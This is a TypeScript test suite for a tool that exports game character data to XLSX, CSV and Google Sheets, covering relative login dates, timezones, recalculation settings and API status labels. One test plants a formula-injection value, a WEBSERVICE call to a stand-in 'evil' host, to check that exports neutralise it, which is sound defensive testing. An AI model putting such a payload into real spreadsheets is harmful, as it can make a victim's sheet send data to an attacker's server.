import { expect, test } from "bun:test";
import { strFromU8, unzipSync } from "fflate";
import {
  relativeLogin,
  relativeLoginFormula,
  validatedRelativeDates,
} from "../src/dates.ts";
import { HttpClient } from "../src/http.ts";
import { columnPresentation, displayApiStatus } from "../src/presentation.ts";
import { publishSheets, sheetRequests } from "../src/sheets.ts";
import { buildTables, toCsv, toXlsx } from "../src/workbook.ts";
import { snapshot } from "./helpers.ts";

function datedTables(timestamp = "2026-11-07T01:30:00.000Z") {
  const base = snapshot.rows[0];
  if (!base) throw new Error("fixture");
  return buildTables({
    ...snapshot,
    rows: [
      { ...base, character: { ...base.character, lastLoginAt: timestamp } },
    ],
  });
}

test("relative logins age by calendar day, including timezone midnight and DST changes", () => {
  expect(
    relativeLogin("2026-11-07T00:00:00.000Z", "2026-11-07T23:59:59.000Z"),
  ).toBe("Today");
  expect(
    relativeLogin("2026-11-06T23:59:59.000Z", "2026-11-07T00:00:00.000Z"),
  ).toBe("1 day ago");
  expect(
    relativeLogin("2026-11-01T12:00:00.000Z", "2026-11-07T00:00:00.000Z"),
  ).toBe("6 days ago");
  expect(
    relativeLogin("2026-11-08T00:00:00.000Z", "2026-11-07T00:00:00.000Z"),
  ).toBe("Future date");
  expect(
    relativeLogin(
      "2026-11-07T01:30:00.000Z",
      "2026-11-07T12:00:00.000Z",
      "America/New_York",
    ),
  ).toBe("1 day ago");
  expect(
    relativeLogin(
      "2026-11-01T04:30:00.000Z",
      "2026-11-02T05:30:00.000Z",
      "America/New_York",
    ),
  ).toBe("1 day ago");
  expect(
    relativeLogin(
      "2026-03-08T05:30:00.000Z",
      "2026-03-09T04:30:00.000Z",
      "America/New_York",
    ),
  ).toBe("1 day ago");
  expect(() =>
    relativeLoginFormula("2026-11-07T00:00:00.000Z", "invalid/private-zone"),
  ).toThrow("timezone");
});

test("only the fixed last-login formula is emitted; arbitrary strings and malformed date metadata stay out of formula code", () => {
  const tables = datedTables();
  const table = tables[0];
  if (!table) throw new Error("fixture");
  const columns = table.rows[0] ?? [];
  const dateColumn = columns.indexOf("Last Login");
  expect(columnPresentation("Characters", "Last Login (UTC)").hidden).toBe(
    true,
  );
  expect(columnPresentation("Characters", "Last Login").hidden).toBe(false);
  const literal = '=WEBSERVICE("https://evil.invalid")';
  const row = table.rows[1];
  if (!row) throw new Error("fixture");
  row[0] = literal;
  const files = unzipSync(toXlsx(tables));
  const sheet = strFromU8(
    files["xl/worksheets/sheet1.xml"] ?? new Uint8Array(),
  );
  expect(sheet).not.toContain("<f>");
  expect(sheet).toContain("Last Login (at export)");
  expect(sheet).toContain("Today");
  expect(sheet).toContain("=WEBSERVICE");
  expect(toCsv(table.rows)).toContain("'=WEBSERVICE");
  const requests = sheetRequests(tables, [], {}, "America/New_York") as {
    updateCells?: {
      range?: unknown;
      rows: {
        values: {
          userEnteredValue?: { formulaValue?: string; stringValue?: string };
        }[];
      }[];
    };
  }[];
  const values = requests.find((r) => r.updateCells?.range)?.updateCells
    ?.rows[1]?.values;
  expect(values?.[dateColumn]?.userEnteredValue?.formulaValue).toBe(
    `=${relativeLoginFormula("2026-11-07T01:30:00.000Z", "America/New_York")}`,
  );
  expect(values?.[0]?.userEnteredValue?.stringValue).toBe(literal);
  for (const date of [
    { row: 1, column: dateColumn, timestamp: literal },
    {
      row: 1,
      column: columns.indexOf("Player Notes (Editable)"),
      timestamp: "2026-11-07T01:30:00.000Z",
    },
    { row: 0, column: dateColumn, timestamp: "2026-11-07T01:30:00.000Z" },
  ])
    expect(() =>
      validatedRelativeDates({ ...table, relativeDates: [date] }),
    ).toThrow();
});

test("Sheets reads the actual spreadsheet timezone for the view-relative date without changing unrelated tabs", async () => {
  let body: unknown;
  const http = new HttpClient(async (url, init) => {
    if (init?.method === "POST") {
      body = JSON.parse(String(init.body));
      return Response.json({});
    }
    expect(String(url)).toContain("properties(timeZone,autoRecalc)");
    return Response.json({
      properties: { timeZone: "America/New_York" },
      sheets: [],
    });
  });
  await publishSheets(
    datedTables(),
    "example-spreadsheet-id",
    "test-token",
    http,
  );
  expect(JSON.stringify(body)).toContain("DATE(2026,11,6)");
  expect(JSON.stringify(body)).not.toContain("DATE(2026,11,7)");
});

test("character and profession status labels share one enum while keeping component scopes independent", () => {
  expect(displayApiStatus(["ok", "ok"])).toBe("Complete");
  expect(displayApiStatus(["unavailable", "unavailable"])).toBe("Unavailable");
  expect(displayApiStatus(["error"])).toBe("Incomplete");
  expect(displayApiStatus(["ok", "unavailable"])).toBe("Incomplete");
  expect(displayApiStatus(["ok"], true)).toBe("Incomplete");
  expect(displayApiStatus(["unavailable"], true)).toBe("Incomplete");
  expect(displayApiStatus(["manual"])).toBe("Manual");
  const base = snapshot.rows[0];
  if (!base) throw new Error("fixture");
  const tables = buildTables({
    ...snapshot,
    rows: [
      {
        ...base,
        profileStatus: "ok",
        talentStatus: "ok",
        professionStatus: "unavailable",
      },
    ],
  });
  const character = tables[0],
    profession = tables[1];
  if (!character || !profession) throw new Error("fixture");
  expect(
    character.rows[1]?.[
      character.rows[0]?.indexOf("Character API Status") ?? -1
    ],
  ).toBe("Complete");
  expect(
    profession.rows[1]?.[
      profession.rows[0]?.indexOf("Profession API Status") ?? -1
    ],
  ).toBe("Incomplete");
  const unavailable = buildTables({
    ...snapshot,
    rows: [
      {
        ...base,
        profileStatus: "unavailable",
        talentStatus: "unavailable",
        professionStatus: "unavailable",
        character: { ...base.character, primary: [], secondary: [] },
      },
    ],
  });
  expect(unavailable[0]?.rows[1]).toContain("Unavailable");
  expect(unavailable[1]?.rows[1]).toContain("Unavailable");
});

test("relative-date recalculation is enabled once, preserves faster settings, and missing timezone stops all writes", async () => {
  for (const [autoRecalc, includeDates, change] of [
    ["ON_CHANGE", true, true],
    ["MINUTE", true, false],
    ["HOUR", true, false],
    ["ON_CHANGE", false, false],
  ] as const) {
    let batch:
      | {
          requests: {
            updateSpreadsheetProperties?: {
              properties: { autoRecalc: string };
            };
            updateCells?: unknown;
          }[];
        }
      | undefined;
    const http = new HttpClient(async (_, init) => {
      if (init?.method === "POST") {
        batch = JSON.parse(String(init.body));
        return Response.json({});
      }
      return Response.json({
        properties: { timeZone: "America/New_York", autoRecalc },
        sheets: [],
      });
    });
    await publishSheets(
      includeDates ? datedTables() : buildTables(snapshot),
      "example-spreadsheet-id",
      "test-token",
      http,
    );
    const updates =
      batch?.requests.filter((r) => r.updateSpreadsheetProperties) ?? [];
    expect(updates).toHaveLength(change ? 1 : 0);
    if (change)
      expect(
        batch?.requests[0]?.updateSpreadsheetProperties?.properties.autoRecalc,
      ).toBe("HOUR");
  }
  for (const timeZone of [undefined, "private-invalid-zone"]) {
    let writes = 0;
    const http = new HttpClient(async (_, init) => {
      if (init?.method === "POST") writes++;
      return Response.json({ properties: { timeZone }, sheets: [] });
    });
    await expect(
      publishSheets(
        datedTables(),
        "example-spreadsheet-id",
        "test-token",
        http,
      ),
    ).rejects.toThrow("timezone");
    expect(writes).toBe(0);
  }
});
